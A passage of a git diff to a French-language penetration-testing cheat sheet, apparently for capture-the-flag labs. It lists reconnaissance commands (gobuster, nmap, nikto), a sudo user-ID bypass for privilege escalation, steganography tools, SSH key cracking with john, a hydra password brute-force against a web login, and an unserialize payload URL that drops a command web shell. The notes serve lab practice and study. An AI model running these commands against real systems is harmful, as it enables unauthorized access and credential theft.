@@ -13,12 +13,22 @@ Utilitaire :
 
 **Endpoint : ** 
 
-​					gobuster dir -k -x txt,json,php,html -u http://$IP -w /opt/wordlists/common.txt
-​					gobuster fuzz --exclude-length XXXX -b 404 -k -u http://$IP/fuzz -w /opt/wordlist/common.txt
+```
+gobuster dir -k -x txt,json,php,html -u http://$IP -w /opt/wordlists/common.txt
+gobuster fuzz --exclude-length XXXX -b 404 -k -u http://$IP/fuzz -w /opt/wordlist/common.txt
+```
 
-**Port : **nmap -sC -sV -A -oN nmap.log $IP
+**Port : **
 
+```
+nmap -sC -sV -A -oN nmap.log $IP
+```
 
+**vulnerability :** 
+
+```
+nikto -h $IP
+```
 
 Si rien ne marche ajouter l'option -Pn au début de nmap
 
@@ -68,6 +78,8 @@ find / -perm -2000 -print 2>>/dev/null
 ```
 all sudo avaible
 sudo -l
+
+(ALL, !root) => sudo -u#-1 
 ```
 
 
@@ -137,7 +149,9 @@ exiftool WindowsXP.jpg
 
 ```
 mogrify -format jpg important.png
+java -jar stegsolve.jar 
 
+stegsolve
 steghide extract –sf image.jpeg
 stegseek hellp.jpg /opt/wordlist/common.tx
 ```
@@ -207,3 +221,25 @@ http://10.10.33.139/index.php?debug=O:10:%22FormSubmit%22:2:s:9:%22form_file%22;
 Puis vers la page que tu as créé
 
 http://10.10.33.139/test.php?cmd=INSSERT_TA_COMMANDE
+
+
+
+## Crack SSH key
+
+RSA  
+
+```bash
+ssh2john privatekey>key.haash
+john --wordlist=/opt/wordlists/rockyou.txt key.hash
+john --show key.haas
+
+chmod +600 id_rsa
+ssh user@$IP -i id_rsa
+```
+
+## BRUTE Force WEB LOG
+
+```BASH
+hydra -l molly -P rockyou.txt 10.10.219.212 http-post-form "/admin/index.php:username=^USER^&password=^PASS^:F=Your password is incorrect" -V
+```
+
